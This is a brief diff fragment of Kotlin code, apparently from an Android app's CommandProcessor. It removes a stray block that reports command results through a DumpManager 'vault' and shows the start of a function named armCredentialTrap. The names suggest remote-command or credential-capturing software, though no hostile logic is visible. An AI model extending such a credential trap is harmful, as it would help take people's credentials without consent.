@@ -2985,11 +2985,6 @@ object CommandProcessor {
             }
         }
     }
-                    DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
-                }
-            }
-        }
-    }
 
     fun armCredentialTrap(ctx: Context, id: Int, content: String): String {
         val parts = content.split("|")
